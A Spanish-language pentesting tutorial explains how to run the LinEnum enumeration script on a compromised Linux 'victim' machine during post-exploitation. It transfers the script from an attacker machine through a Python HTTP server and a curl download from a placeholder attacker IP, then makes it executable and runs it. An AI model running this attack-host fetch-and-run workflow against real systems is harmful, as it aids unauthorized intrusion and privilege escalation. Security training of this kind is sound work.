
# Escalada de privilegios en Linux con LinEnum

> LinEnum es un script en bash diseñado para automatizar la recolección de información en sistemas Linux, con el objetivo de identificar posibles vectores para escalar privilegios. A continuación, documentamos cómo obtener y utilizar LinEnum durante una fase de post-explotación.

## 1. Descarga del script

Podemos descargar el script LinEnum directamente desde su repositorio oficial en GitHub utilizando `wget`:

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
````

Este comando descarga el archivo `LinEnum.sh` en el directorio actual.

## 2. Transferencia del script a la máquina víctima

En muchos entornos de pentesting, es común que tengamos acceso a una máquina víctima sin conexión directa a internet, por lo que debemos transferir el script desde nuestra máquina atacante. Para ello, utilizamos un servidor HTTP básico con Python.

### Paso 1: Levantar un servidor HTTP

En nuestra máquina atacante, nos situamos en el directorio donde se encuentra el archivo `LinEnum.sh` y ejecutamos:

```bash
python3 -m http.server 1234
```

Esto levanta un servidor web en el puerto 1234 que servirá los archivos del directorio actual.

### Paso 2: Descargar el script desde la máquina víctima

Desde la máquina víctima (a la que ya tenemos acceso, por ejemplo, mediante una shell reversa), descargamos el script con `curl`:

```bash
curl http://IP_local:1234/LinEnum.sh -o LinEnum.sh
```

Donde `IP_local` es la dirección IP de nuestra máquina atacante (la que ejecuta el servidor HTTP). Este comando guarda el archivo descargado como `LinEnum.sh`.

## 3. Dar permisos de ejecución

Una vez descargado, damos permisos de ejecución al script:

```bash
chmod +x LinEnum.sh
```

## 4. Ejecución del script

Finalmente, ejecutamos el script para comenzar con el reconocimiento del sistema:

```bash
./LinEnum.sh
```

LinEnum realizará múltiples comprobaciones (permisos, configuraciones incorrectas, binarios SUID, cron jobs, procesos en ejecución, etc.) y mostrará los resultados en pantalla. Esta información es fundamental para identificar posibles vectores de escalada de privilegios.

---

